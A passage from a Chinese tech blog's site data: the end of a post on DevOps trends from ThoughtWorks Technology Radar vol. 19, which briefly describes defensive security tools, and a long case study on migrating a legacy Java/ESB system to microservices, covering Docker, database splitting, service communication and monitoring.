替代方案。与 Flask 不同的是 Nameko 只包含了 WebSocket、HTTP、AMQP 支持等有限功能。我非常喜欢这种简单而轻量的框架，如果你采用 Python 作为微服务的实现语言，你可以考虑考虑它。\nJavaScript 社区曾经有一个从前端到后端“一统天下”的设想。也出现了 MEAN 这样的全栈 Javascript框架。现在 F# 社区出现了一个有力的竞争者：SAFE 。SAFE 技术栈是 Suave、Azure、Fable 和 Elmish 的简称。SAFE 囊括了一系列技术，形成了前后端一致的 Web 开发技术栈。SAFE 在服务端和浏览器端都使用了 F# 语言，因此注重于异步函数式类型安全的编程机制。它不仅提供了一些提高开发效率的功能比如热加载; 还允许替换技术栈里的某些模块，例如服务器端 Web 框架或云提供商。它很有希望成为微软技术栈下 Serverless 微服务架构的候选者。\n微服务的误区 #随着微服务越来越火，很多组织开始盲目的追求微服务架构。但很多团队都把架构通过把简单的 API 进行复杂的整合使架构更加难以维护。它用运维复杂性换取了开发的复杂性。然而，这需要坚实的自动化测试，持续交付和 DevOps 能力作为支撑。\n这期技术雷达提出的分层式微服务架构(LAYERED MICROSERVICES ARCHITECTURE)的组织是一种反模式，他们在某些方面存在着明显的矛盾。这些组织都陷入了以技术角色为主来划分服务的误区，比如，用户体验API、进程 API 或系统 API等。这样会导致业务变更仍然会有缓慢而昂贵的多团队合作。\n另外一点是，当中台战略逐渐开始流行后，会导致前台团队和后台团队被从技术上分开，而缺乏了微服务所需要的整体业务能力。中台更多强调的是内部应用的产品化和 SaaS 化能力。而不仅仅是割裂为独立的微服务。这样，你需要额外的一个中间层来做前台和中台之间的转换。而这样一个中间层，无论是放到前台和中台都是不合理的。我仍然推荐围绕业务能力组建一个端到端的微服务团队。\n由于微服务很多都支持基于事件的异步调用方式，这也影响到了前端用户体验的设计。这就是**在面向用户的工作流中使用请求 — 响应事件 (REQUEST-RESPONSE EVENTS IN USER-FACING WORKFLOWS)**的系统设计。这样一来，要么UI被阻塞，要么用户就必须等页面收到响应消息后重新加载。做出这类设计的主要依据往往是为了性能或是为了用统一的方式来处理后端之间的同步和异步通信。但这样做会在开发、测试和运维上所增加不必要的复杂度，远远超过了采用这种统一方式带来的好处。所以，在用户可接受的场景下，直接使用同步HTTP 请求来处理后端服务之间的同步通信，而不必改成事件驱动的设计。如果设计的精妙，使用HTTP通信很少会成为分布式系统的瓶颈。\n微服务架构的一个显著特征是系统组件和服务是围绕业务能力进行组织的。无论系统规模大小，微服务都需要将系统功能和信息进行有意义的分组和封装，以便拆分后的微服务能彼此独立地交付业务价值。微服务是从业务角度对架构的重新审视，而以前的服务架构方式会从技术角度组织服务。\n安全 #技术雷达从来没有像这一期有这么多的安全相关的内容。今年的信息安全事件频发，并和技术的发展结合在一起，往往给人们一种“新技术一定会带来安全问题”的错觉。而安全的主要因素是人，工具只是降低工作量和节省工作时间的一种方式，它不能替代安全设计和安全活动本身。我把安全单独列为一节主要是为了能够使您对安全实践有一个端到端的认识。\n运维相关的安全实践和工具 #对敏感数据保持适当的控制是相当困难的，尤其是在出于对数据备份和恢复的目的而将数据复制到主数据系统之外的时候。**密钥粉碎(CRYPTO SHREDDING)**是通过故意覆盖或删除用于保护该数据的加密密钥来使敏感数据无法读取的做法。例如，可以使用随机密钥对数据库中客户个人详细信息表的所有记录进行一对一加密，然后使用另一张表来存储密钥。如果客户行使了“被遗忘的权利”，您可以简单地删除相应的密钥，从而有效地“粉碎”加密数据。当你有信心对小规模加密密钥集合维持适当控制，但对较大数据集的控制信心不足时，此项技术非常有效。\n在云计算平台上维护基础设施首要的工作就是设立一个安全的框架，其次需要实践和工具来进行安全检查。\n继混沌工程（Chaos Engineering）之后，安全混沌工程(Security Chaos Engineering) 也发展的越来越好，使用此技术的团队确信他们的安全策略足以应对常见的安全故障模式。不过，这方面的实践仅有 ChaoSlingr一个工具，且仅支持 AWS 平台。就像之前提到的 Chaos Engineering Katas，我相信未来会有 Security Chaos Engineering Katas 作为日常安全的练习。\n随着云计算平台基础设施即代码的复杂度提升，相应的安全扫描工具也应运而生。Watchmen是个采用 Python 编写的工具，它为由交付团队自主拥有和运营 AWS 账户配置提供基于规则驱动的扫描。技术雷达所提到的 Scout2 已经不再维护，它被迁移到了ScoutSuite，目前支持 AWS，但即将包括 Azure 和 Google Cloud Platform。我强烈建议你将这些工具集成到你的**基础设施流水线（Pipeline for Infrastructure）**里。\n开发相关的安全实践和工具 #我们已经经历了一些把密码存储到代码库上导致的数据泄露实践。将安全凭据或其他机密提交到源代码仓库是一个主要的攻击向量。GIT-SECRETS 是防止将密码或其他敏感信息提交到 git 仓库的小工具。AWS 实验室也提供了一个同名的工具，git-secrets 内建支持常见的 AWS 密钥和凭据，也可以为其他的提供商进行快速配置。\nSNYK是一个可以查找、修复及监控 npm 、Ruby 、Python 、Scala 、Golang 、.NET 、PHP 、Java 与 Docker 依赖树中漏洞的平台。将 Snyk 加入构建流水线后，它会基于一个托管的漏洞数据库，持续地监控和测试你的库依赖树。在发现漏洞时，还可以给出可以解决该安全问题的最小的依赖版本。目前它支持多种 Git 仓库服务和 PaaS 平台服务。\n如果你想对 Web 应用进行安全扫描，你可以采用 Archery，它是一个开源的安全工具，并正在将其与其他工具(包括 Zap )相结合，轻松地将安全工具集成到构建与部署系统中。你也可以通过 Archery 的工作面板，跟踪漏洞及应用程序和网络的安全扫描结果。\n同样，随着微服务的流行，它的安全问题也被提升到了最高的高度。SPIFFE (Secure Production Identity Framework For Everyone， 适用于所有人的安全生产身份框架)以特制X.509证书的形式为现代生产环境中的每个工作负载提供安全标识。 SPIFFE消除了对应用程序级身份验证和复杂网络级ACL配置的需求，Istio 默认就采用了 SPIFFE。\n参考 #https://www.thoughtworks.com/cn/radar/\nhttps://cloudplatformonline.com/2018-state-of-devops.html\nhttps://puppet.com/resources/whitepaper/state-of-devops-report\n","date":"December 10, 2018","permalink":"/blog/2018/2018-12-10-devops-trend-from-tech-radar-vol19/","section":"Blogs","summary":"","title":"从第19期技术雷达看 DevOps 的发展趋势"},{"content":"","date":null,"permalink":"/tags/%E5%AE%B9%E5%99%A8/","section":"Tags","summary":"","title":"容器"},{"content":"在上一篇文章《我们如何衡量一个微服务实施的成功》里，我们介绍了衡量一个微服务改造成功的七个特征，分别是：\n很多个代码库，以及一一对应的流水线。 应用可以随时部署，并不需要等待。 大量的自动化测试。 更少的变更事故。 更低的发布风险。 可以按需扩展。 更多的自动化手段。 而本篇文章所介绍的案例，也符合这篇文章中对“微服务实施成功”的定义。不过，我们将通过以下五个方面来介绍我们是如何做到达到这七点的：\n通过度量驱动架构的微服务化； 微服务平台的演进； 数据库的独立演进； 服务间的轻量级通信； 微服务的全链路跟踪； 微服务演进的技术背景 #2013年，当我加入这个“微服务改造”项目中的时候，微服务远没有像今天这么火。那个时候我还不知道这种架构演进的方式叫做“微服务”。直到我离开这个项目把其中的经验带到其它项目里，才对敏捷，DevOps和微服务有了进一步的认识。\n当时，我们刚刚协助客户把应用程序从自建数据中心迁移到亚马逊云计算服务（AWS）上，并通过 DevOps 等实践做到了按月发布。然而，新的挑战接踵而至。当客户决定开始做微服务之前，遇到了以下三点问题：\n运维风险高，发布的时候需要整体发布。除了累积了应用变更以外，还有基础设施的变更。 开发效率低，由于单体应用存储在一个代码库里。导致各功能，项目，维护团队之间产生依赖，交付效率很低。 内部多个应用系统之间需要集成，但缺乏单一可信数据源（Single Source of Truth）。 作为很早就采用敏捷方式开发的企业来说，该企业很多敏捷实践都做的非常成熟，并往往作为澳大利亚敏捷成功的案例标杆。在我加入的时候，客户已经采用持续集成很长时间了。而迁移到 AWS，还需要将部署和运维部分自动化，从技术层面为 DevOps 做了很好的准备。那时候我们所依赖的仍然是用 Chef 去构建自动化的脚本进行部署，并开始采用 Ansible 这种技术做发布的标准化。\n通过度量驱动架构的微服务化 #我们所拥有的是一个基于 Spring 2.5 的 Java 遗留系统，各个系统之间由 ESB （Enterprise Service Bus 企业服务总线）串联起来。多个不同的业务线（Line of Business，LoB）拥有各自独立的产品组件，但都是基于同一套代码库。\n这样的痛点很明显：\n每个业务线都要有自己的子产品，但大家都基于同一份代码库。 每个业务线对自己产品的改动，会影响到其它的系统。 由于不同的系统的组件依赖于不同的环境和不同的数据库，所以部署所带来的风险很高。 随着开发人员的不断增加，以上的痛点越来越明显，我们发现很多工作因为开发阻塞而无法前行。于是就有了一个最基础的度量：发布阻塞时间。\n当我们把敏捷看板构建起来，我们可以很清楚的看到需求分析、开发、测试的各环节时间。当时并没有采用 DevOps，我们的持续发布也仅限于 Staging（准生产环境），而各个环节内可以采用更具有生产力的实践我们可以缩短环节时间，降低浪费。但，阻塞时间则随着需求的增加而增加。\n当阻塞时间在上涨的时候，主观的组织规划已经和应用系统规划不符了。于是，产品则根据业务线被划分成了三个产品，如下图所示：\n于是有了三个代码库，和三条不同的流水线。每个业务线都负责构建自己的代码库和周边生态。这样虽然会带来代码的重复，让很多有 DRY（Don\u0026rsquo;t Repeat Yourself ）癖的架构师难以接受。但毕竟各产品未来要走自己的路，因此，为了让各业务线不阻塞，各自采用各自的代码库进行发布。于是原先的团队随着代码库的分离而分隔成了不同的团队。但是，Ops 团队却没有分隔开，而是作为通用能力继续支持着各产品线的发展。\n这也就是康威定律所说的：“设计系统的组织，其产生的设计等同于组织之内、组织之间的沟通结构。”\n这一次的拆分尝到了甜头，除了各个业务线开发阻塞时间缩短以外，各个业务线的产品的发布失败率和故障率也降低了。于是我们继续采用工具提升发布的成功率和效率，直到我们发现我们系统里的 ESB 成为了我们的瓶颈。于是我们开始进行了微服务的拆分。\n我们预期的策略是采用“拆迁者模式”：即新建一套子系统，再统一的进行迁移，一步到位。能够这样做的前提是要有足够的自动化测试覆盖当前所有的业务场景。于是我们根据我们需要拆分的功能先编写自动化测试，在自动化测试通过的情况下可以保障我新编写的代码不会影响现有的功能，包括数据迁移后的测试。\n然而，拆迁者模式最大的挑战来自于切换风险，为了避免切换造成的风险就要补全自动化测试，这样的成本是巨大的。除非很早就开始做好了责任独立的设计。否则，不要用拆迁者模式。\n另外两种模式就是“绞杀者模式”和“修缮者模式”。前者有一个别名，叫做“停止挖坑”，意思就是不要在当前的系统里继续增加功能，而是采用松耦合的方式增加新的功能，使得老的功能慢慢被绞杀掉。这种模式的前提就是要确认遗留系统不再进行功能新增，只做 Bug 修复和例行维护。这样带来的变更风险最小，但演进时间较长。对于“新遗留系统”——刚刚开始转入维护不到半年的新系统，可以采用这种方式。\n然而，我们所碰到的应用系统则是一堆运行时间超过5年的遗留系统。于是我们采用了“修缮者模式”。修缮者模式源于古老的软件工程格言：“任何问题都可以通过增加一个中间层解决”。\n我们首先做了一个前后端分离，采用 RESTful API 作为后台，向 PC 浏览器和手机 App 提供数据交互。这样，无需为移动应用单独编写后台应用，只需要复用之前写好的 API 就可以了。这就是当前很多应用进行微服务改造的第一步。\n到了后期，我们发现有些需要很多 API 需要进行转化，所以我们当时做了一个叫做 Syndication API 的东西，它实际上一个一个 API 的集合。通过反向代理重新暴露后端的数据和接口。这当时是为了能够给 Mobile 端提供数据所准备的过度方案。所以我们采用了 Ruby 这种可以快速开发的语言（讲真，Ruby 开发的项目都不大好维护，一部分原因是 Ruby 程序员水平差异太大，另一部分原因是 Ruby 版本和各组件更新的问题）。后来我们发现，完成一个功能需要给 Web 和 Mobile 端做重复的开发。所以，我们决定在前后端分离的基础上逐渐替换掉老的 Web 应用，即便它运行的很稳定。\n为了降低风险，我们就再一次对 Syndication API 进行了拆分。把一个单体 API 集合根据 LoB 功能的依赖程度拆分成了 API 的组。这样，我们可以在用户端无感知的情况下修改后台的部署架构。这时候，虽然没有做到微服务，但我们通过各自的 API 分离出来了完整的业务并在遗留系统之间创建了一个适配层隔离风险。以后我们只需要写代码替代原有的逻辑就可以了。\n这样，我们构建一个防腐层，将微服务和遗留系统隔离开。对新的微服务化组件采用独立的代码库，进行持续交付和持续部署。那个时候没有 Docker 这样成熟的技术，也没有 Spring 全家桶这么便利的框架。所以我们选择了 Ruby 和 Ansible 进行开发和部署。大体过程如下：\n构建新的自动化测试：采用 Cucumber ，Capybara 和 Selenium 来实现前端测试。Junit 和 Moco 做后端测试。 构建隔离层：通过把原先的实现类（Class）抽象成接口（Interface）来做到松耦合，并在 Spring 中注册不同名称的实现。 增加特性开关：一部分在 Spring 的 applicationContext.xml 文件中实现，一部分用 Redis 在线实现。 用自动化测试驱动微服务的开发：有了之前的自动化测试，我们只需要将特性开关打开，就可以使用新的类。哪里的测试失败了，就提示我们哪里应该被修复。当然，在过程中会增加新的自动化测试。 发布运行：采用 AWS 和 Ansible 构建轻量级的镜像发布。 删除特性开关和遗留旧代码：上线6个月之后，我们把接口保留住，之前的实现类相关代码和配置从源代码中删除。 选择模块也有讲究，有以下几个策略：\n前后端拆分 把经常变更的部分拆分 把公共的部分进行拆分 根据业务拆分 根据领域模型拆分 当时我们是根据系统菜单的导航进行拆分的，因为用户菜单本身就是分割好的业务。这是大粒度的拆分，然后就可以定下原则，针对不同的技术特点和运维特点进行小粒度的拆分。\n此外，在选择拆分策略的过程中，我们涉及两方面的估算（度量），一方面是成本，一方面是收益。\n成本里除了人员的成本以外，还包括风险。在度量风险之前，要问这几个问题：\n假设我们的拆分一定会失败，这个失败会带来多大的影响？ 假设我们要修复，成本最低的修复方案会花多少成本。 这里的影响我们可以把“故障范围”、“故障时间”、“单位范围故障成本” 三者相乘得出来一个估算值。然后再加上微服务的开发成本和回退成本三个部分，构成微服务开发的总成本。这种算法虽然简单粗暴，但也能说明问题。\n而微服务带来的收益，则是将上文度量的阻塞时间（以人天为单位），乘以研发人数和系统运行时间构建出来的一个函数。而这个函数也可以说明微服务带来的系统规模增长的投资回报周期。在不同的团队里，这个回报周期都是不一样的。一般都在 6 个月以上。也就是说，投入微服务拆分后 6 个月，微服务所带来的投资产出才会持平。\n“重要的不是技术有多先进，而在于你清醒的认识到新技术引入带来的成本和收益。”\n有了以上几方面的度量，我们就对相应系统和子系统是否要进行微服务有了一个相对清晰的认识。并不是所有的微服务拆分都划算，有些系统保持原样，采用绞杀者模式慢慢迁移可能更好。如果采用拆迁者模式，急功近利带来的问题可能更多。所以，一个成熟的微服务架构应该是一个混合型的系统，如下图所示：\n上图 是一个分层架构，最上面一层是前台，其次是后台，后台之间的不同微服务也采用了不同的语言。有些微服务则仅仅是一个对外的 API，有些系统并未转化成微服务。例如上图左侧的 Monolith，就是一个 Java 的单块应用。其中MS 代表 Microservice。\n我遇到的很多想采用微服务的团队往往纠结于自己“是不是”一个微服务架构。但我觉得你可以在架构中先“有一个微服务”，看看它带来的投入和回报，再考虑如何扩展自己的微服务。\n微服务平台 #在微服务的演进道路中，随着微服务的数量增加，微服务的治理成为了一个突出的问题。而随着技术的进步，微服务的治理思想和工具也发生了变化。我们的微服务演进经历了以下四个阶段：\n阶段一：自部署的生命周期管理工具 阶段二：公共的微服务管理工具 阶段三：基于 Docker 容器的微服务管理工具 阶段四：基于 容器平台的微服务管理工具 阶段一：自部署的生命周期管理工具（2013年之前） #在微服务实践早期的时候，我们希望我们新部署的应用可以没有任何依赖。再加上 DevOps 实践的影响，我们期望每个微服务团队都是一个全功能的 DevOps 团队。\n我们会在代码库里建立一个 deploy 文件夹，把自动化的部署脚本放在里面，集成一些 APM 工具和日志收集代理。并根据不同的环境构建配置文件。利用基础设施即代码技术自动化完成，并且集成到持续部署流水线中进行管理。那时候并没有 Docker 这样方便的技术。于是，我们采用一个代码库，一条流水线，一个虚拟机镜像的方式进行部署。\n这时候微服务的实践还有一个重要的点是去容器化，这里的容器指的是像 WebLogic 和 Tomcat 这样的 Java 应用容器，而不是 Docker 这样的容器技术。对于 Java 来说，当时可以选择 DropWizard，它可以把 Web 应用打成一个可执行的 JAR 包运行，现在的做法就是用 Spring Boot。也可以选择 Jetty，用 Gradle 把它集成到 build 文件里，作为一个任务运行。如果你是 Ruby，就可以用 Ruby On Rails 或者 Sinatra 这样的框架来运行。虚拟机镜像里只需要安装一个语言运行时和固定的应用启动点就可以了。\n这样就做到了独立开发、独立部署。降低了应用复杂度并减少了以来，这可以使得团队更加高产。\n阶段二：公共的微服务管理工具（2013年——2014年） #随着微服务数量的增长，你会发现每个微服务工程都有同样的基础设施管理部分。于是我们通过代码重构，把公共的部分提取出来，变成了一个公共的微服务管理工具，它支持微服务的全生命周期管理。这样的工具一般是用 Gradle （Java应用）或者 Rake （Ruby 应用）来构建的。他们可以做到微服务从构建（build）到部署（deployment）的一系列任务。\n通用的管理工具的另外一面就是应用的开发规范。两方面必须同时存在，否则这样的工具会失去意义。所以，微服务管理平台的意义在于不光能够节约很多重复建设的成本，更能够将最佳实践变成一种制度，进行快速复制和推广。\n你可能会有疑问，微服务本质上是要做去中心化的。但这么做不就催生了新的中心化吗？\n这个问题，对了一半。关键的部分在于工具和应用的依赖程度。你可以把这一类工具单独当做一个特殊的“微服务”来对待：它应该和其它应用之间松耦合的，提供所有应用都共享的功能，但必须要和业务部分独立开，无侵入性的和微服务应用程序组合在一起。\n催生这个工具诞生的另外一个原因就是组织内存在独立且共享的运维团队。大部分的企业应用系统的开发和运行平台维护是不同的两个团队，这就导致了开发和运维的分离，这样不利于 DevOps 的组织形成。然而，在我的课程《DevOps 转型实战中》，我介绍了这种组织形式下实践 DevOps 的方式，就是让运维团队的成员去不同的开发团队内“轮岗”：让每一个微服务团队在改造的过程中成为一个 DevOps 团队，作为一个运维团队的使者。在改造结束后回归到运维团队，将经验分享并带给其它的开发团队，这样可以减少组织中的运维浪费。\n然而，把业务代码和运维代码解耦并不是一件很容易的事情，当时也是微服务推广的一个技术难点，困扰了很多人。直到 Docker 的出现。\n阶段三：基于 Docker 的微服务管理工具（2014年——2016年） #Docker 成为了 DevOps 和微服务事实上的推手。可以说，没有 DevOps 的实践和 Docker 这个工具，就没有今天微服务的流行。\n作为最早将 Docker 应用到生产环境的团队，我们最初仅仅是把 Docker 作为一个“轻量级的虚拟机”（Light Weight Virtual Machine）来看。它可以快速的构建一个干净、稳定的运行时环境（Runtime Environment）并且做到快速启动和水平扩展，十分让人兴奋。\n于是，我们把每个应用都通过 Docker 封装。由于那时候没有 docker-compose（其前身是一个名为 fig 的工具）和 k8s 的管理平台。也只能用 Shell 脚本来管理，然而 Shell 脚本的结构化能力有限，于是我们的团队的一个运维工程师在周末用 Python 自己撸了一个管理工具出来。那时是我们能找到的唯一容器编排工具，可惜作为最早的 Docker 编排工具没有开源。于是就有了 fig 这样相同的工具出现。随着 Docker 后期再开源社区的一系列收购工作，Docker 的开发话语权慢慢被 Docker 公司回收，这都是后话。\n我们把前端代码和后端代码封装起来，通过 docker 的 link 功能构建了统一的内部 API 接入点。这样就可以减少自动化部署代码中不同环境之间的配置。也可以很轻易的把运维和开发解耦，降低 DevOps 团队中的沟通成本。\n然而这里有个非常不好的实践就是不停的构建 Docker 镜像。从运维的角度说，不断的构建 Docker 镜像会导致不必要的网络流量和存储资源，特别是很多按流量和空间付费的云计算服务。另一方面，构建镜像会增加部署流程时间，虽然 Docker 的构建和下载会启用缓存，但是一些基础镜像的变更就会带来所有镜像的重新构建。\n这就是容器的状态化，状态化的容器不算是一个好的实践。但是，这也比没有容器之前的状态要好很多。\n所以，我推荐把 Docker 容器当做一个稳定的运行时，不要频繁的构建镜像。通过 Volume 参数将宿主机中的文件挂载到容器里，这就是将 Docker 镜像里的状态移除，做到容器的无状态化。这样，容器镜像会稳定且高效。\n阶段四：基于容器平台的微服务平台（2015年至今） #当微服务通过 Docker 承载之后，微服务借由 Docker 的快速扩展和运维隔离两项优势快速发展起来。但同时也带来了很多问题。就像我在前文中说的，微服务本质上把应用的内部复杂性转化成外部复杂性。并且用具备弹性的基础基础设施来承载外部复杂性。很多公共组件，例如微服务的注册和发现、一致性、日志、APM等慢慢的容器化。包括容器的编排和资源伸缩等基础能力、以及数据库等都用容器化统一起来。\n这样，容器就成为了统一的抽象，作为所有应用的通用运行链接格式（Generic ELF，Executable and Linkable Format ）和通用运行时（Generic Runtime）。\n这也让我们从“胖进程”（Rich Process）的角度来重新看待容器技术，和“轻量级虚拟机”不同。我们把 Dockerfile 看做是语言无关的源代码，Docker build 看做是编译和链接，Docker 镜像看做是构建出的可执行文件，Docker 容器看做是进程。\n到了这个阶段，容器作为一等公民，就需要一个操作系统。而且，这种操作系统是跨平台的。无论是物理机，虚拟机还是云计算实例，都可以无缝的和容器进行集成，这时候就需要统一的容器解决方案。\n于是，三大容器编排平台应运而生，分别是基于 Docker Swarm 的 Docker EE，Mesosphare 和 Kubernetes。当然，Kubernetes 已经作为绝对的赢家，并且在 CNCF 的支持下，形成了完整的微服务生态圈。所以到了现在这个阶段，CNCF 的相关技术才是微服务发展的方向，每个工具环环相扣，形成了一个完整的微服务生态。\n阶段五：标准化的微服务架构参考模型 #随着微服务生态的渐渐成熟，特别是在开源社区和 CNCF 的作用下。微服务的基础设施基本上已经不可能有太多的创新点，大部分的优秀实践都被整合成为了开源项目，逐步从 CNCF 孵化毕业。2017年，很多实践微服务的企业开始构建自己的微服务化产品。未来，微服务的基础设施会标准化并且将提供更加透明且廉价的云原生解决方案。随之而来的是公共领域的应用解决方案，例如用户管理和登录这样的基础组件会第一个被微服务化。\n毕竟，我们没有必要重新发明那么多轮子……\n独立存储/混合存储 # 成功的微服务的另一个特征就是数据库可以进行拆分和按需扩展，这样你可以独立维护。但是如果你的数据库性能足够好或者你数据库结构并不是很好，你可以保持这种方式。然而，很多变更频繁的系统会有很复杂的数据模型，而这样的数据模型往往是制约应用架构演进的最大瓶颈。特别是，很多关系型数据库的严格结构约束着应用的方式。\n当我们通过领域驱动设计重新对应用架构进行划分后，你会发现数据模型往往是一团糟：存在着很多重复的表和重复的记录，包括一些临时的方案，表之间的关系异常复杂，做一点改动都会“牵一发动全身”。\n这时会有两种解决方案，但无论哪一种方案，都会带来冗余数据和数据迁移。但无论如何，都要坚持“单一可信数据源”，也就是 Single Source of Truth 原则。\n第一种方案比较简单，就是采用 NoSQL 数据库单独承载一个或多个微服务的数据访问请求，例如 MongoDB，CouchDB 等，用 key-value 这种松散的结构来存储数据。并把对数据模型的约束放在应用代码里而不是数据模型的定义里。这样就可以更灵活的组织数据，而不用担心数据在数据库内的定义。我们往往把经常变更结构的数据存放在 NoSQL 数据库里，而稳定的数据结构存储在关系型数据库里，然后进行数据库迁移。\n第二种方案比较复杂，就是做关系型数据库的迁移。这种比较复杂，但一定要记住一点：不要变更遗留库！不要变更遗留库！不要变更遗留库！重要的话说三遍。\n原因很简单：不值得，特别是在一个经历了不同架构师和开发人员流动的遗留系统上。你会发现你在变更的时候会遇到多方的阻力，而且验证方案特别费时费力。这时候如果不停劝阻强硬执行，只会“大力出悲剧”。\n这时候，我们只需要将应用和对应的数据版本化。为新应用建立一个数据库，某个时间点之后的数据，全部进入新库，老数据库相对稳定，只读不写。这时候无论数据库和代码，一定会有冗余数据，但不要紧，你只要确定新库是最终的单一可信数据源即可。你可以增加增加新功能，让用户自己做数据迁移，迁移后要把老数据库中对应的数据删除，或者打标记。经过一段时间后，剩下的遗留数据就会越来越少，这就是数据库迁移的“绞杀者模式”。\n另外一种是数据库迁移的“修缮者模式”：先构建一个新的 API，将它对应的数据结构作为一个数据模型进行直接查询和存储，如果查询不到，则到老的数据库中进行查询，然后组装一份新的数据存储到新库中，再进行操作。\n另外一个注意点就是：应用和数据库一起迁移！应用和数据库一起迁移！应用和数据库一起迁移！\n很多架构师在迁移的时候为了快速将功能上线，不迁移数据库，仅仅变更 API，会在代码中保留一部分兼容性代码。这就留下了技术债。而且，这种兼容性妥协会带来 n 个中间过渡版本，永远到达不了彼岸。\n并不是说数据库的拆分是必须的。刚开始，我们往往会单一数据库，多微服务访问的形式。到后来，我们就会把它拆分成右边的形式。\n你可能会问我，为什么一个库会被多个微服务访问，不是应该一个微服务对应一个库吗？要么就是这几个微服务不应该被拆分，而应该合并？\n微服务和库的对应关系受以下几个因素影响：\n不同的微服务的 SLA 是不同的。为了做到按需扩展，有必要在多个微服务可能会访问同一个库。 减少冗余数据，为了保证“单一可靠数据源”并减少冗余数据，几个微服务需要访问同一个库。 业务特性和性能特性。这方面主要的策略有读写分离、动静分离等。 数据库承载着服务间的通信功能。 在数据库拆分的时候，要注意数据的冗余和一致性问题。为了提升效率，独立数据库里的适当冗余是必要的。但是，如果为了避免冗余，而不断跨库和跨 API 查询很密集的是偶，很有可能你的微服务拆分错误。毕竟，跨网络的访问性能远远不如在一个进程上下文中的性能。\n从数据库的查询频率和性能来进行数据库的拆分和重组也是拆分微服务的技巧之一。一般的原则是：“先拆表，后拆库。关联查询先拆分后合并”。这会是一个反复校准的过程，很难一次成功。另外，我比较推荐把关系写到应用逻辑里而不是数据库里，这样就可以减少一些底层的依赖，可以隔离数据库和表集中管理带来的连锁问题。\n轻量级服务间通信 # 去 ESB 化 #就像前文所述，最早的时候我们采用 ESB （企业消息总线，Enterprise Service Bus）集成各个异构的系统。通过统一的接入方式将不同的系统集成到一起。在当时，这是流行的 SOA 架构的核心理念。但问题随之而来：随着集成到 ESB 上的系统越来越多，你会发现 ESB 要处理各种系统之间的协议转换和数据转换就会带了很多额外的工作量和性能开销。最主要的是 ESB 成为了核心的依赖，如果 ESB 维护，所有的服务都会被阻塞住。慢慢的，松散耦合的不同系统和服务会因为 ESB 耦合又成为了一整块应用。\n然而，当时并没有新兴的解决方案能够解决这些痛点，直到移动互联网技术的兴起。当我们开始做前后端分离的时候大量采用基于 Ruby 和 Scala 的轻量级应用框架和 json 这样的轻量级协议，这些低成本的快速项目给客户和我们都带来了信心。于是我们开始把集成在 ESB 上的系统根据业务线逐个剥离下来，使每一个单独的应用可以独立发布和部署。\n这样，随着引入轻量级的框架和协议不断引入，我们就离传统的，重量级的 SOA 越来越远。这是后来我们“成为”微服务的重要标志之一。\nREST 还是 RPC #REST 还是 RPC，这是常见的两种微服务通信风格，最重要的区别是你看待微服务的方式。\n我们并没有采用 RPC，而采用了 REST。我们把微服务抽象成为了资源，基于资源对外提供服务。这样，我们很清楚应该如果对外暴露什么内容，同时应该隐藏什么细节。这点很可能是和 AWS 学习的，它们把每一个服务都抽象成了一个状态机，加上我们又基于 AWS 进行部署，所以 REST 成为了一个自然的选择。\nRPC 是另外一个选择，但 RPC 的下述缺点是我们关注的：\n调试复杂性，RPC 有时候会隐藏很多细节，这些细节会变成日后调试的深坑。 脆弱性，使用 RPC 的前提是“网络是可靠的”，事实上网络并不会那么可靠，尤其是异构系统中。 技术强绑定，例如 Java RMI 这种技术，就需要双方使用同样的技术栈，这实际上破坏了微服务架构本身的好处。 这也并不是说 RPC 一无是处，RPC 很容易使用，你很容易就可以给 RPC 的客户端和服务端打桩并开始开发。而且很多 RPC 的协议本质上是 二进制的，能够自己处理序列化，性能会比 REST 高很多。\n采用 MQ 通信 #发布者 - 订阅者 本身就是一个比较理想的系统间松耦合的通信方式。然而，ESB 的侵入性实现使之成为了负担。然而基于消息队列的方式则会轻量很多。\n微服务倾向于统一的数据交流格式和异步的调用，减少了阻塞的发生并提高了系统的性能。于是我们就将 ESB 换成了消息队列和 API 调用。而消息队列和 RESTful API Call 本身就算是一种系统拆分的重要方式。它把系统的内部依赖转化到了外部。\n一个成功的微服务拆分，服务间的依赖会少。与此伴随着应用系统内的同步调用减少，异步调用增多。采用异步调用取代同步调用也可以看作是微服务拆分的一种方式。\n现在，大家都会采用 Kafka 作为消息队列。但是，请警惕不要把 Kafka 变成了另外一种 ESB。\n采用数据库进行通信 #虽然我并不推荐这种数据传递的方式，因为这本质上就是一种底层的耦合。但采用数据库的表作为一种过渡手段在复杂的数据库拆分的时候起到了关键作用。然而，在这种模式下一定要确立“写的微服务”和“读的微服务”分离，否则会变成双向依赖。一般会采用 CQRS （命令查询责任分离）模式来拆分微服务。诸如“增、删、改”这样的命令服务要和查询服务分开来。\n选择最适合你的通信方式 #这里需要说明的是，我们要从业务场景和系统的实际情况出发来选择合适的通信场景。微服务倾向于透明的格式和轻量级的协议。重要的是，我们选择方法时要尊重“网络不总是很稳定”的事实来进行设计。\n另一方面，为了快速定位风险和问题，我们可以通过消息队列和 RESTful API 的方式是把内部的依赖暴露到了外部，使得内部的“暗知识”可以充分暴露。减少了系统的风险和修复时间。\n而如果你的微服务通讯太频繁了并带来了额外的风险和成本，有可能你的微服务就已经拆错了。在这种情况下，你可能需要考虑合并微服务。这取决于系统的性能和稳定性，也取决于你的维护成本。\n一个成功的微服务拆分也带来了开发的独立性，由于你的服务是异步调用的，应该可以独立部署和发布，没有其他的依赖且不会造成额外的影响。如果你的微服务拆分之后，开发的流程仍然很长，就要考虑组织流程上的拆分了。\n微服务全链路监控 # 上图这是我们采用 NewRelic 做的微服务的监控，可以看到左边是一些业务系统，接着中间的微服务，最后右是数据库。为了保密，我把微服务的名字用蓝色的框覆盖了，你可以看到。这是一个 NodeJS + PHP 和 MySQL 的混合架构。\n你的微服务运维也需要有微服务相互的健康检查的连接图。以前可能只需要关注一个应用的表现。而到了微服务架构后，你需要关注每一个节点。只有一条依赖上的所有服务都健康了才算健康，但是中间如果有一个不可用的话，哪怕它的失败率很低，如果你的依赖链很长的话，你的应用的健康度就是这些节点的可用率相乘的结果。比如你有三个依赖的微服务，他们的可用率都是99%，那么业务的可用率就是 99% * 99% * 99% = 0.970299，也就是 97.02%。但三个微服务如果不相互依赖，它们的可用率仍然是 99%。所以，服务间依赖越多，系统的风险越高。这也从数学的角度上证明了微服务的优势。\n当微服务数量多了之后，我们就不能考虑单个应用的成功性，我们考虑的是这一块集群的失败率做整体监控，得到系统监控的可用率。当原先的系统内部依赖暴露到外部之后，运维的工作就不仅仅是关注之前的“大黑盒”了，这就需要开发和运维共同合作，这也是微服务团队必须是 DevOps 